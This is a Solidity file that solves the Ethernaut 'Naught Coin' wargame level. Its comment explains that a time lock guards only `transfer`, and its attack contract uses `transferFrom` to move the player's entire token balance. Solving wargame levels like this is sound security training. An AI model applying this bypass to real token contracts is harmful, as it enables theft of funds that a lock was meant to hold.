// # Ethernaut 15: Naught Coin
//
// A time lock is applied to `NaughtCoin`'s override of `IERC20.transfer`. That's
// not the only function `IERC20` provides for transferring tokens: there's also
// `IERC20.transferFrom`. We just need to approve the attack contract for spending
// our tokens, which is done in the test.


pragma solidity ^0.6.0;

import "./15_NaughtCoin.sol";

import "hardhat/console.sol";

contract NaughtCoinAttack {
    NaughtCoin instance;

    constructor (address instanceAddr) public {
        instance = NaughtCoin(instanceAddr);
    }

    function transferPlayerBalance () public {
        address player = instance.player();
        uint playerBalance = instance.balanceOf(player);
        instance.transferFrom(player, address(this), playerBalance);
    }
}
